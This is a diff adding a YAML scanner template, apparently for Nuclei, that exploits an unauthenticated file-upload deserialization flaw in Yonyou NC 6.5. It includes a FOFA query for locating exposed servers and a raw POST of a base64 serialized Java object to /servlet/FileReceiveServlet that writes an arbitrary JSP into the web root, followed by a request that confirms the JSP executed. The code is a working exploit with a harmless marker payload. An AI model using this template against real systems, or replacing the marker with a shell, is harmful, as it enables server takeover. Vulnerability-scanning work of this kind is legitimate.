@@ -1,0 +1,45 @@
+id: yonyou-nc-servlet-upload-rce
+
+info:
+  name: 用友NC6.5反序列化文件上传漏洞
+  author: wuha
+  severity: critical
+  description:  用友NC产品文件上传的漏洞，恶意攻击者可以通过该漏洞上传任意文件，从而可能导致获取到目标系统管理权限。漏洞为文件上传漏洞，在无需登陆系统的情况下，通过某接口直接上传文件，恶意攻击者成功利用该漏洞可获得目标系统管理权限，系统如果直接暴露在互联网上风险较大，建议及时排查。
+  reference:
+    - https://mp.weixin.qq.com/s/gKKtmakYRbJCqzKGjDnRBg
+  metadata:
+    fofa-query: app="用友-UFIDA-NC" "/platform/yonyou-yyy.js"
+  tags: yonyou,nc,fileupload
+  
+  
+variables:
+    r1: '{{rand_base(5)}}'
+    r2: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAAJRklMRV9OQU1FdAAJ"
+    r3: "LmpzcHQAEFRBUkdFVF9GSUxFX1BBVEh0ABAuL3dlYmFwcHMvbmNfd2VieA=="
+
+http:
+  - raw:
+      - |
+        POST /servlet/FileReceiveServlet HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;
+        Content-Length: 550
+        Connection: close
+
+        {{base64_decode(r2)}}{{r1}}{{base64_decode(r3)}}<%out.print("{{randstr}}");%>
+      - |
+        GET /{{r1}}.jsp HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{randstr}}'
+
+      - type: status
+        status:
+          - 200
